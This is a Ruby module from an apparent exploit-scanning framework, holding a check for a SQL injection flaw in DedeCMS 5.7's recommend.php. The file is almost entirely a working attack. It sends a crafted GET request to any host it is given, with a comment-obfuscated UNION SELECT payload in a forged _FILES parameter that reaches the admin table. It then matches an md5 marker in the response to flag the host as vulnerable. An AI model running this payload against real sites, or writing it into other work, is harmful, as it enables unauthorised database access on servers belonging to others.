
class Exploit_5 < FastExp

  def initialize
    @exp_id = 5
    @exp_name = "Dedecms5.7 Sql"
    @exp_type = "HOST"
    @exp_txt = "Dedecms5.7 recommend.php sql injection"
    @pattern = /.*2e0e20673083dea5cc87a85d54022049.*/
  end

  def exp(type, arg)
	begin
		return if !type.include?(@exp_type)
    	html = HTTP.get("http://"+arg+"/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@%60%27%60)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20%60%23@__admin%60%23").to_s
    	@match = @pattern.match html
    	@found = true if @match != nil
	rescue
		@error = true
		@error_info = "error:#{$!} at:#{$@}"
	end
  end

end

FastCfg+[Exploit_5.new]

